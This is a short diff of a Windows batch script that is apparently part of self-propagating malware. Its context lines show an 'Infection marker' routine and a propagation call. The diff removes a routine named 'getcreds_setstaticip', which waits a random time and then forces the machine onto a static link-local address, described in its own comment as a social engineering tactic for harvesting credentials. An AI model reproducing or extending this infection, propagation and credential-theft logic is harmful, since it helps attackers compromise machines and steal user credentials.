@@ -65,19 +65,7 @@
 	::subsequent host sequence
 	call :add_marker
 	call :prop_seq
-
-
 	exit /b 0
-
-
-:::: TRASH ME 
-:getcreds_setstaticip
-	:: Set random time before setting static IP as a social engineering tactic.
-	set /a rval=(%RANDOM%*60/32768)+1
-	timeout /t %rval% /nobreak > nul
-	netsh interface ip set address "Local Area Connection" static 169.254.0.1 255.255.0.0
-	exit /b 0
-
 
 :add_marker
 	:: Infection marker
